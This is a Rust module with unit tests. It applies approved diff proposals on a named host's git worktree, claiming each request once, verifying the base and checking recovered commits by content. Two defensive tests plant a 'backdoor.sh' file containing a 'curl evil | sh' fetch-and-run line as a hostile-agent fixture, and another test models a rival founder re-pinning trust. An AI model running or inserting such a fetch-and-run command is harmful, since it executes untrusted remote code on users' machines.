//! Applying a proposal on a person's request (Phase B): the host side of
//! "Apply on ‹host›".
//!
//! A person (from a desktop or a phone) files a `ProposalApplyRequested`
//! naming one host. That host, and only that host, applies it, once:
//!
//! 1. It finds the open requests that name it ([`pending`]); a request whose
//!    proposal a held event touches waits.
//! 2. It **claims** the request in its own store before any git work
//!    (`apply_attempts`, device-local): a restart or a second tick never
//!    applies it again.
//! 3. It judges the `ProposalApplied` it is about to write exactly as every
//!    fold will ([`ChatService::would_allow`]); a request the fold would
//!    refuse (withdrawn, the proposal no longer approved, a human gate) is
//!    reported as failed, and nothing touches the checkout.
//! 4. It applies the patch in the chat's worktree on the base the person saw
//!    (a moved checkout fails), commits with a `Ligus-Apply-Request:` trailer,
//!    and writes `ProposalApplied` naming the request, its commit, base and
//!    tree; or `ProposalApplyFailed` with the reason.
//!
//! The fold enforces the rest on every device: only the named host fulfils a
//! request, a closed request is never fulfilled again, a proposal has one
//! open request at a time, and nobody else applies it meanwhile.
//!
//! A host that crashed between its commit and its event finds the commit by
//! its trailer on restart and reports it; one that crashed before the commit
//! reports the request failed, so the person can ask again.

use std::path::Path;
use std::sync::Mutex;

use hive_core::workspace_repo::ApplyRequest;
use hive_core::{workspace_config_session_id, ActionProposal, ProposalKind, SessionEvent, Timestamp};
use uuid::Uuid;

use crate::chat_service::{ChatError, ChatService, Result};

/// The commit trailer naming the request a host's commit fulfils.
pub const TRAILER: &str = "Ligus-Apply-Request";

/// An open apply request naming this host.
#[derive(Debug, Clone)]
pub struct ApplyJob {
    pub chat_id: Uuid,
    pub workspace_id: Uuid,
    pub request: ApplyRequest,
    pub proposal: ActionProposal,
    /// The trusted founder the service was pinned to when the job was listed
    /// ([`ChatService::set_trusted_founder`]). [`fulfil`] judges the job
    /// under this pin, whatever another workspace's work re-pinned the
    /// service to meanwhile (a client with several workspaces shares one
    /// service).
    pub founder: Option<String>,
}

/// What [`fulfil`] did.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Outcome {
    /// Applied: the commit (when one was made) is on the chat's branch and
    /// `ProposalApplied` is written.
    Applied { commit: Option<String> },
    /// Not applied; `ProposalApplyFailed` is written with this reason (when
    /// the fold still allowed one).
    Failed { reason: String },
    /// Nothing done yet (a held event touches the proposal): try again later.
    Waiting,
    /// Already handled by an earlier attempt on this host.
    Done,
}

/// The open apply requests in `workspace_id` that name this host.
pub fn pending(svc: &ChatService, workspace_id: Uuid) -> Result<Vec<ApplyJob>> {
    let me = svc.device_id();
    let founder = svc.trusted_founder().map(str::to_string);
    let config = workspace_config_session_id(workspace_id);
    let mut out = Vec::new();
    for id in svc.store().list_session_ids()? {
        if id == config {
            continue;
        }
        let Ok(Some(s)) = svc.load(id) else { continue };
        if s.workspace_id != workspace_id {
            continue;
        }
        for req in s.apply_requests.values() {
            if req.host_device_id != me || s.apply_outcomes.contains_key(&req.id) {
                continue;
            }
            if svc.store().apply_attempt_finished(req.id)? {
                continue;
            }
            if let Some(p) = s.proposals.iter().find(|p| p.id == req.proposal_id) {
                out.push(ApplyJob { chat_id: s.id, workspace_id, request: req.clone(), proposal: p.clone(), founder: founder.clone() });
            }
        }
    }
    Ok(out)
}

fn lock(svc: &Mutex<ChatService>) -> std::sync::MutexGuard<'_, ChatService> {
    svc.lock().unwrap_or_else(|e| e.into_inner())
}

/// The service, locked and pinned to `founder` until the guard drops, when
/// its own pin is put back. Every decision about one job is made under the
/// pin it was listed under ([`ApplyJob::founder`]).
pub(crate) struct Pinned<'a> {
    guard: std::sync::MutexGuard<'a, ChatService>,
    prev: Option<String>,
}

impl<'a> Pinned<'a> {
    pub(crate) fn new(svc: &'a Mutex<ChatService>, founder: Option<&str>) -> Self {
        let mut guard = lock(svc);
        let prev = guard.trusted_founder().map(str::to_string);
        guard.set_trusted_founder(founder.map(str::to_string));
        Self { guard, prev }
    }
}

impl std::ops::Deref for Pinned<'_> {
    type Target = ChatService;
    fn deref(&self) -> &ChatService {
        &self.guard
    }
}

impl std::ops::DerefMut for Pinned<'_> {
    fn deref_mut(&mut self) -> &mut ChatService {
        &mut self.guard
    }
}

impl Drop for Pinned<'_> {
    fn drop(&mut self) {
        let prev = self.prev.take();
        self.guard.set_trusted_founder(prev);
    }
}

fn pinned<'a>(svc: &'a Mutex<ChatService>, job: &ApplyJob) -> Pinned<'a> {
    Pinned::new(svc, job.founder.as_deref())
}

fn git(dir: &Path, args: &[&str]) -> std::result::Result<String, String> {
    let out = hive_core::process_util::git().arg("-C").arg(dir).args(args).output().map_err(|e| format!("git {}: {e}", args[0]))?;
    if out.status.success() {
        Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
    } else {
        Err(format!("git {}: {}", args[0], String::from_utf8_lossy(&out.stderr).trim()))
    }
}

fn git_apply(dir: &Path, diff: &str) -> std::result::Result<(), String> {
    use std::io::Write;
    use std::process::Stdio;
    let mut child = hive_core::process_util::git()
        .arg("-C")
        .arg(dir)
        .args(["apply", "--whitespace=nowarn"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("git apply: {e}"))?;
    child.stdin.take().ok_or("git apply: no stdin")?.write_all(diff.as_bytes()).map_err(|e| format!("write patch: {e}"))?;
    let out = child.wait_with_output().map_err(|e| format!("git apply: {e}"))?;
    if !out.status.success() {
        return Err(format!("the change doesn't apply on this host's checkout ({})", String::from_utf8_lossy(&out.stderr).trim()));
    }
    Ok(())
}

fn short(c: &str) -> &str {
    &c[..c.len().min(12)]
}

/// The `ProposalApplied` this host writes for `job`.
fn applied_event(job: &ApplyJob, me: Uuid, commit: Option<String>, base: Option<String>, tree: Option<String>) -> SessionEvent {
    SessionEvent::ProposalApplied {
        proposal_id: job.request.proposal_id,
        diff_digest: job.request.diff_digest.clone(),
        commit,
        at: Timestamp::now(),
        repo_id: job.request.repo_id,
        applied_on: Some(me),
        base_commit: base,
        applied_tree_hash: tree,
        request_id: Some(job.request.id),
    }
}

/// Report `job` failed (when the fold still takes a report), and finish it.
fn fail(svc: &Mutex<ChatService>, job: &ApplyJob, reason: String) -> Result<Outcome> {
    let mut s = pinned(svc, job);
    if let Err(e) = s.fail_apply_request(job.chat_id, job.workspace_id, job.request.id, &reason) {
        tracing::warn!(target: "apply", request = %job.request.id, "couldn't report the failure: {e}");
    }
    s.store().finish_apply_attempt(job.request.id)?;
    Ok(Outcome::Failed { reason })
}

/// The commit on the chat's worktree that fulfils `request`, if one was made.
/// Only a hint: anything in the worktree (an agent turn included) can write
/// the trailer, so [`is_the_change`] decides whether it is the apply.
fn commit_for(worktree: &Path, request: Uuid) -> Option<String> {
    let grep = format!("--grep={TRAILER}: {request}");
    git(worktree, &["log", "-1", "--format=%H", "--fixed-strings", &grep]).ok().filter(|c| !c.is_empty())
}

/// Whether commit `c` is exactly `diff` applied onto its parent (and that
/// parent is `expected_base`, when the person named one): its tree is the
/// one the patch makes from the parent's, built in a scratch index that
/// never touches the worktree.
fn is_the_change(worktree: &Path, c: &str, diff: &str, expected_base: Option<&str>) -> bool {
    use std::io::Write;
    use std::process::Stdio;
    let (Ok(parent), Ok(tree)) = (git(worktree, &["rev-parse", &format!("{c}^")]), git(worktree, &["rev-parse", &format!("{c}^{{tree}}")])) else {
        return false;
    };
    if expected_base.is_some_and(|b| b != parent) {
        return false;
    }
    let index = std::env::temp_dir().join(format!("ligus-apply-{}.index", Uuid::new_v4()));
    let run = |args: &[&str], input: Option<&str>| -> Option<String> {
        let mut cmd = hive_core::process_util::git();
        cmd.arg("-C").arg(worktree).args(args).env("GIT_INDEX_FILE", &index);
        cmd.stdin(if input.is_some() { Stdio::piped() } else { Stdio::null() }).stdout(Stdio::piped()).stderr(Stdio::piped());
        let mut child = cmd.spawn().ok()?;
        if let Some(text) = input {
            child.stdin.take()?.write_all(text.as_bytes()).ok()?;
        }
        let out = child.wait_with_output().ok()?;
        out.status.success().then(|| String::from_utf8_lossy(&out.stdout).trim().to_string())
    };
    let made = run(&["read-tree", &parent], None)
        .and_then(|_| run(&["apply", "--cached", "--whitespace=nowarn"], Some(diff)))
        .and_then(|_| run(&["write-tree"], None));
    let _ = std::fs::remove_file(&index);
    made.is_some_and(|t| t == tree)
}

/// Apply `job` on this host, once. `repo` is this host's checkout for the
/// chat (none: the host can't apply it).
pub fn fulfil(svc: &Mutex<ChatService>, job: &ApplyJob, repo: Option<&Path>) -> Result<Outcome> {
    let me = pinned(svc, job).device_id();
    if job.request.host_device_id != me {
        return Err(ChatError::Unauthorized("that apply request is for another host".into()));
    }
    // A held vote or decision on it: no side effect until it is decided.
    {
        let s = pinned(svc, job);
        let Some(session) = s.load(job.chat_id)? else { return Ok(Outcome::Waiting) };
        if session.authz.blocks(job.proposal.id, job.proposal.set_id) {
            return Ok(Outcome::Waiting);
        }
        if session.apply_outcomes.contains_key(&job.request.id) || s.store().apply_attempt_finished(job.request.id)? {
            return Ok(Outcome::Done);
        }
    }
    let worktree = repo
        .filter(|r| crate::git_worktree::is_git_repo(r))
        .and_then(|r| crate::git_worktree::chat_worktree(r, &job.chat_id.to_string()).ok());
    // Claim it before anything touches the checkout.
    if !pinned(svc, job).store().claim_apply_attempt(job.request.id)? {
        // An earlier attempt here was interrupted: report what it did.
        let diff = job.proposal.diff.as_deref().filter(|_| job.proposal.kind == ProposalKind::FileDiff).unwrap_or_default();
        let expected = job.request.expected_base_commit.as_deref();
        let found = worktree
            .as_deref()
            .and_then(|w| commit_for(w, job.request.id).filter(|c| !diff.is_empty() && is_the_change(w, c, diff, expected)));
        if let Some(c) = found {
            let wt = worktree.as_deref().unwrap_or(Path::new("."));
            let base = git(wt, &["rev-parse", &format!("{c}^")]).ok();
            let tree = git(wt, &["rev-parse", &format!("{c}^{{tree}}")]).ok();
            let mut s = pinned(svc, job);
            let r = s.fulfil_apply_request(job.chat_id, job.workspace_id, job.request.id, Some(c.clone()), base, tree);
            s.store().finish_apply_attempt(job.request.id)?;
            return match r {
                Ok(_) => Ok(Outcome::Applied { commit: Some(c) }),
                Err(e) => Ok(Outcome::Failed { reason: e.to_string() }),
            };
        }
        return fail(svc, job, "this host restarted before it applied the change; ask again".into());
    }
    // Would the fold take it? (Withdrawn meanwhile, no longer approved, a
    // human gate, the base the person saw.)
    let probe = applied_event(job, me, None, job.request.expected_base_commit.clone(), None);
    // Bound first: a guard in an `if let` scrutinee would still be held
    // (edition 2021) when `fail` locks again.
    let allowed = pinned(svc, job).would_allow(job.chat_id, job.workspace_id, probe);
    if let Err(e) = allowed {
        return fail(svc, job, format!("not applied: {e}"));
    }
    let diff = match (job.proposal.kind, job.proposal.diff.as_deref()) {
        (ProposalKind::FileDiff, Some(d)) => d.to_string(),
        _ => return fail(svc, job, "this host applies file changes only; implement this proposal from a desktop".into()),
    };
    let Some(wt) = worktree else {
        return fail(svc, job, "this host has no checkout for this chat".into());
    };
    let base = match git(&wt, &["rev-parse", "HEAD"]) {
        Ok(b) => b,
        Err(e) => return fail(svc, job, e),
    };
    if let Some(expected) = job.request.expected_base_commit.as_deref() {
        if expected != base {
            return fail(svc, job, format!("the checkout moved since the request (expected {}, at {})", short(expected), short(&base)));
        }
    }
    // Only the approved change goes into the commit: anything an agent turn
    // left in the worktree would otherwise ride along under the person's
    // request (`git add -A`).
    match git(&wt, &["status", "--porcelain", "--untracked-files=all"]) {
        Ok(st) if st.is_empty() => {}
        Ok(_) => return fail(svc, job, "the checkout has uncommitted changes; commit or discard them, then ask again".into()),
        Err(e) => return fail(svc, job, e),
    }
    if let Err(e) = git_apply(&wt, &diff) {
        return fail(svc, job, e);
    }
    let message = format!("Apply proposal: {}\n\n{TRAILER}: {}\n", job.proposal.title, job.request.id);
    // A headless box may have no git identity: give the commit one, keeping
    // the host's own when it has one.
    let named = git(&wt, &["config", "user.email"]).is_ok_and(|e| !e.is_empty());
    let mut commit_args = if named { vec![] } else { vec!["-c", "user.name=Ligus", "-c", "user.email=ligus@localhost"] };
    commit_args.extend(["commit", "-q", "-m", &message]);
    let committed = git(&wt, &["add", "-A"]).and_then(|_| git(&wt, &commit_args));
    if let Err(e) = committed {
        let _ = git(&wt, &["reset", "--hard", &base]);
        return fail(svc, job, e);
    }
    let commit = git(&wt, &["rev-parse", "HEAD"]).ok().filter(|c| *c != base);
    let tree = git(&wt, &["rev-parse", "HEAD^{tree}"]).ok();
    let mut s = pinned(svc, job);
    let written = s.fulfil_apply_request(job.chat_id, job.workspace_id, job.request.id, commit.clone(), Some(base.clone()), tree);
    s.store().finish_apply_attempt(job.request.id)?;
    drop(s);
    match written {
        Ok(_) => Ok(Outcome::Applied { commit }),
        Err(e) => {
            // The fold refused it after all (withdrawn in between): take the
            // commit back, so this host didn't apply what nobody asked for.
            if commit.as_deref().is_some_and(|c| git(&wt, &["rev-parse", "HEAD"]).ok().as_deref() == Some(c)) {
                let _ = git(&wt, &["reset", "--hard", &base]);
            }
            Ok(Outcome::Failed { reason: e.to_string() })
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::EventStore;
    use hive_core::{ActorIdentity, ActorKind, ProposalStatus, SigningKeypair};
    use hive_core::workspace_repo::ApplyOutcome;

    const DIFF: &str = "diff --git a/new.txt b/new.txt\nnew file mode 100644\n--- /dev/null\n+++ b/new.txt\n@@ -0,0 +1 @@\n+hello\n";

    fn sh(dir: &Path, args: &[&str]) -> String {
        git(dir, args).unwrap()
    }

    /// A person's device that is also the host it names (a desktop applying
    /// on itself), a repo, an approved file-diff proposal and the request.
    fn setup() -> (Mutex<ChatService>, Uuid, Uuid, ApplyJob, tempfile::TempDir) {
        setup_in(|_| EventStore::open_in_memory().unwrap())
    }

    /// [`setup`] with the store `open(tmp)` makes.
    fn setup_in(open: impl FnOnce(&Path) -> EventStore) -> (Mutex<ChatService>, Uuid, Uuid, ApplyJob, tempfile::TempDir) {
        let tmp = tempfile::tempdir().unwrap();
        let store = open(tmp.path());
        let repo = tmp.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        sh(&repo, &["init", "-q", "-b", "main"]);
        sh(&repo, &["config", "user.email", "t@example.com"]);
        sh(&repo, &["config", "user.name", "t"]);
        std::fs::write(repo.join("README.md"), "x\n").unwrap();
        sh(&repo, &["add", "-A"]);
        sh(&repo, &["commit", "-q", "-m", "init"]);
        let account = Uuid::new_v4();
        let mut author = ActorIdentity::new(account.to_string(), "Ana", ActorKind::Human);
        author.account_id = Some(account);
        let mut svc = ChatService::new(store, SigningKeypair::generate().unwrap(), SigningKeypair::generate().unwrap(), author);
        svc.enable_test_presence();
        // Pinned to its own founding, as a host pins a workspace's founder.
        svc.set_trusted_founder(Some(account.to_string()));
        let wid = Uuid::new_v4();
        svc.ensure_workspace_config(wid).unwrap();
        let chat = svc.create_chat("c", wid, "anthropic").unwrap();
        let mut p = ActionProposal::file_diff("Add new.txt", "agent", DIFF.into(), vec!["new.txt".into()]);
        p.created_at = Timestamp::epoch();
        let pid = p.id;
        svc.upsert_proposal(chat.id, wid, p).unwrap();
        let r = svc.vote_on_proposal(chat.id, wid, pid, true).unwrap().unwrap();
        assert_eq!(r.status, ProposalStatus::Approved);
        let wt = crate::git_worktree::chat_worktree(&repo, &chat.id.to_string()).unwrap();
        let head = sh(&wt, &["rev-parse", "HEAD"]);
        let me = svc.device_id();
        svc.request_apply(chat.id, wid, pid, me, Some(head)).unwrap();
        let jobs = pending(&svc, wid).unwrap();
        assert_eq!(jobs.len(), 1);
        let job = jobs[0].clone();
        (Mutex::new(svc), chat.id, wid, job, tmp)
    }

    fn outcome(svc: &Mutex<ChatService>, chat: Uuid, job: &ApplyJob) -> Option<ApplyOutcome> {
        lock(svc).load(chat).unwrap().unwrap().apply_outcomes.get(&job.request.id).cloned()
    }

    #[test]
    fn the_named_host_applies_once_and_reports_its_commit() {
        let (svc, chat, wid, job, tmp) = setup();
        let repo = tmp.path().join("repo");
        let r = fulfil(&svc, &job, Some(&repo)).unwrap();
        let Outcome::Applied { commit: Some(c) } = r else { panic!("{r:?}") };
        let wt = crate::git_worktree::chat_worktree(&repo, &chat.to_string()).unwrap();
        // Windows checkouts may use CRLF (core.autocrlf); the committed blob is what counts.
        assert_eq!(std::fs::read_to_string(wt.join("new.txt")).unwrap().replace("\r\n", "\n"), "hello\n");
        assert_eq!(commit_for(&wt, job.request.id).as_deref(), Some(c.as_str()));
        assert_eq!(outcome(&svc, chat, &job), Some(ApplyOutcome::Applied { commit: Some(c.clone()) }));
        let s = lock(&svc).load(chat).unwrap().unwrap();
        assert_eq!(s.proposals[0].status, ProposalStatus::Applied);
        // Nothing left to do, and a second call doesn't apply again.
        assert!(pending(&lock(&svc), wid).unwrap().is_empty());
        assert_eq!(fulfil(&svc, &job, Some(&repo)).unwrap(), Outcome::Done);
        assert_eq!(sh(&wt, &["rev-list", "--count", "HEAD"]), "2");
    }

    #[test]
    fn a_moved_checkout_fails_and_touches_nothing() {
        let (svc, chat, _, job, tmp) = setup();
        let repo = tmp.path().join("repo");
        let wt = crate::git_worktree::chat_worktree(&repo, &chat.to_string()).unwrap();
        std::fs::write(wt.join("README.md"), "moved\n").unwrap();
        sh(&wt, &["commit", "-qam", "moved"]);
        let moved = sh(&wt, &["rev-parse", "HEAD"]);
        let r = fulfil(&svc, &job, Some(&repo)).unwrap();
        assert!(matches!(&r, Outcome::Failed { reason } if reason.contains("checkout moved")), "{r:?}");
        assert_eq!(sh(&wt, &["rev-parse", "HEAD"]), moved);
        assert!(!wt.join("new.txt").exists());
        assert!(matches!(outcome(&svc, chat, &job), Some(ApplyOutcome::Failed { .. })));
        // The proposal stays approved: a person may ask again.
        let s = lock(&svc).load(chat).unwrap().unwrap();
        assert_eq!(s.proposals[0].status, ProposalStatus::Approved);
        assert!(s.open_apply_request(job.proposal.id).is_none());
    }

    #[test]
    fn a_host_without_a_checkout_says_so() {
        let (svc, chat, _, job, _tmp) = setup();
        let r = fulfil(&svc, &job, None).unwrap();
        assert!(matches!(&r, Outcome::Failed { reason } if reason.contains("no checkout")), "{r:?}");
        assert!(matches!(outcome(&svc, chat, &job), Some(ApplyOutcome::Failed { .. })));
    }

    #[test]
    fn a_withdrawn_request_is_never_applied() {
        let (svc, chat, wid, job, tmp) = setup();
        lock(&svc).withdraw_apply_request(chat, wid, job.request.id).unwrap();
        assert!(pending(&lock(&svc), wid).unwrap().is_empty());
        assert_eq!(fulfil(&svc, &job, Some(&tmp.path().join("repo"))).unwrap(), Outcome::Done);
        let wt = crate::git_worktree::chat_worktree(&tmp.path().join("repo"), &chat.to_string()).unwrap();
        assert!(!wt.join("new.txt").exists());
    }

    #[test]
    fn a_restart_after_the_commit_reports_it_and_never_applies_twice() {
        let (svc, chat, _, job, tmp) = setup();
        let repo = tmp.path().join("repo");
        let wt = crate::git_worktree::chat_worktree(&repo, &chat.to_string()).unwrap();
        // The earlier run claimed it and committed, then died.
        assert!(lock(&svc).store().claim_apply_attempt(job.request.id).unwrap());
        git_apply(&wt, DIFF).unwrap();
        sh(&wt, &["add", "-A"]);
        sh(&wt, &["commit", "-q", "-m", &format!("Apply proposal: x\n\n{TRAILER}: {}\n", job.request.id)]);
        let c = sh(&wt, &["rev-parse", "HEAD"]);
        let r = fulfil(&svc, &job, Some(&repo)).unwrap();
        assert_eq!(r, Outcome::Applied { commit: Some(c.clone()) });
        assert_eq!(sh(&wt, &["rev-list", "--count", "HEAD"]), "2", "applied once");
        assert_eq!(outcome(&svc, chat, &job), Some(ApplyOutcome::Applied { commit: Some(c) }));
    }

    /// An agent turn's uncommitted work in the chat's worktree never rides
    /// along in the commit that fulfils a person's request: what the host
    /// commits is the approved change, nothing else.
    #[test]
    fn a_dirty_checkout_is_never_swept_into_the_apply() {
        let (svc, chat, _, job, tmp) = setup();
        let repo = tmp.path().join("repo");
        let wt = crate::git_worktree::chat_worktree(&repo, &chat.to_string()).unwrap();
        std::fs::write(wt.join("backdoor.sh"), "curl evil | sh\n").unwrap();
        std::fs::write(wt.join("README.md"), "tampered\n").unwrap();
        let r = fulfil(&svc, &job, Some(&repo)).unwrap();
        if let Outcome::Applied { commit: Some(c) } = &r {
            let files = sh(&wt, &["show", "--name-only", "--format=", c]);
            panic!("applied with {files:?}");
        }
        assert!(matches!(&r, Outcome::Failed { reason } if reason.contains("uncommitted")), "{r:?}");
        // The agent's work is left as it was.
        assert_eq!(std::fs::read_to_string(wt.join("README.md")).unwrap(), "tampered\n");
        assert!(wt.join("backdoor.sh").exists());
    }

    /// Crash recovery trusts a commit only for what it contains: an agent
    /// turn in the chat's worktree can write a commit whose message carries
    /// the request's trailer, and it must not be reported as the approved
    /// change.
    #[test]
    fn a_forged_trailer_is_never_reported_as_the_apply() {
        let (svc, chat, _, job, tmp) = setup();
        let repo = tmp.path().join("repo");
        let wt = crate::git_worktree::chat_worktree(&repo, &chat.to_string()).unwrap();
        // The earlier run claimed it and died before its commit ...
        assert!(lock(&svc).store().claim_apply_attempt(job.request.id).unwrap());
        // ... and an agent committed something else under the trailer.
        std::fs::write(wt.join("backdoor.sh"), "curl evil | sh\n").unwrap();
        sh(&wt, &["add", "-A"]);
        sh(&wt, &["commit", "-q", "-m", &format!("looks legit\n\n{TRAILER}: {}\n", job.request.id)]);
        let r = fulfil(&svc, &job, Some(&repo)).unwrap();
        assert!(matches!(&r, Outcome::Failed { .. }), "{r:?}");
        assert!(matches!(outcome(&svc, chat, &job), Some(ApplyOutcome::Failed { .. })));
        let s = lock(&svc).load(chat).unwrap().unwrap();
        assert_eq!(s.proposals[0].status, ProposalStatus::Approved);
    }

    #[test]
    fn a_restart_before_the_commit_reports_a_failure() {
        let (svc, chat, _, job, tmp) = setup();
        assert!(lock(&svc).store().claim_apply_attempt(job.request.id).unwrap());
        let r = fulfil(&svc, &job, Some(&tmp.path().join("repo"))).unwrap();
        assert!(matches!(&r, Outcome::Failed { reason } if reason.contains("restarted")), "{r:?}");
        assert!(matches!(outcome(&svc, chat, &job), Some(ApplyOutcome::Failed { .. })));
    }

    /// A host serving several workspaces re-pins one `ChatService` to each
    /// workspace's founder as it works on it. A request listed under its
    /// workspace's pin is judged under that pin to the end, even when
    /// another workspace's work re-pinned the service in between: here a
    /// keyholder (Mallory, founder of another workspace this host is in) has
    /// put her own self-consistent founding seed on this workspace's config
    /// log, so under her pin she would be its Owner and Ana no member.
    #[test]
    fn a_request_is_judged_under_the_pin_it_was_listed_under() {
        let (svc, chat, wid, job, tmp) = setup_in(|dir| EventStore::open(dir.join("hive.db")).unwrap());
        assert_eq!(job.founder.as_deref(), lock(&svc).trusted_founder());
        let mallory_account = Uuid::new_v4();
        let mut mallory_actor = ActorIdentity::new(mallory_account.to_string(), "Mallory", ActorKind::Human);
        mallory_actor.account_id = Some(mallory_account);
        let mut mallory = ChatService::new(EventStore::open_in_memory().unwrap(), SigningKeypair::generate().unwrap(), SigningKeypair::generate().unwrap(), mallory_actor);
        let config = mallory.ensure_workspace_config(wid).unwrap();
        let mut second = EventStore::open(tmp.path().join("hive.db")).unwrap();
        for env in mallory.store().list(config).unwrap() {
            second.ingest(&env).unwrap();
        }
        // Another workspace's write re-pinned the service to Mallory.
        lock(&svc).set_trusted_founder(Some(mallory_account.to_string()));
        let r = fulfil(&svc, &job, Some(&tmp.path().join("repo"))).unwrap();
        assert!(matches!(r, Outcome::Applied { .. }), "judged under another workspace's pin: {r:?}");
        assert_eq!(lock(&svc).trusted_founder(), Some(mallory_account.to_string().as_str()), "the service's own pin is left as it was");
        let _ = chat;
    }

    /// A request the fold refuses at the last check (here: one its log
    /// doesn't hold) is reported failed. The refusal must not still hold the
    /// service's lock when the failure is written, or the host hangs.
    #[test]
    fn a_request_the_fold_refuses_is_reported_without_hanging() {
        let (svc, _, _, mut job, tmp) = setup();
        job.request.id = Uuid::new_v4();
        let repo = tmp.path().join("repo");
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let r = fulfil(&svc, &job, Some(&repo));
            let _ = tx.send(format!("{r:?}"));
        });
        let r = rx.recv_timeout(std::time::Duration::from_secs(60)).expect("fulfil hung on its own lock");
        assert!(r.contains("Failed"), "{r}");
    }
}
